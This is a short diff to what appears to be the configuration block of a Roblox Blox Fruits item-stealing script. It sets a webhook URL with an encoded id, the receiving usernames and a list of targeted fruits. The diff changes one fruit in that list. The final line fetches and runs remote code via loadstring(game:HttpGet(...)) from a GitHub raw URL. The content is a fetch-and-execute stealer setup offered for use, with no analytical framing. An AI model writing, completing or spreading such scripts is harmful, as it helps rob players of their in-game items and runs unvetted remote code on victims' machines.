@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=ZUtlSktROE9JR3BJZkRPV0F2NlYxUTpSN1ZZM204ZnVwY3dUT2dOelY3SF9QR2JjYnNSWXdWLUJicDdiU0xGM3kzRXltcGdPNkNyWTFRN19POGFJWmhTVXBrOXQyUHk2ZHJVakZpcmhaaTRoR1QxSGJUYkFWRGpIS2lQVzhhLTE5ZEZNU1lWNXBnLUhUdW0yWDhzWjVaZTVBalhGS01Vak14dkV3UDNYV2MtSFFUd3hfeGRJQ0NHbGxFSld3cXdpWWs
 Usernames = {gsvsg26, "somealtuserhere2"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Dragon-Dragon"} -- << Fruits you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/W-azure0/redz-hub/refs/heads/main/red%20hub"))()
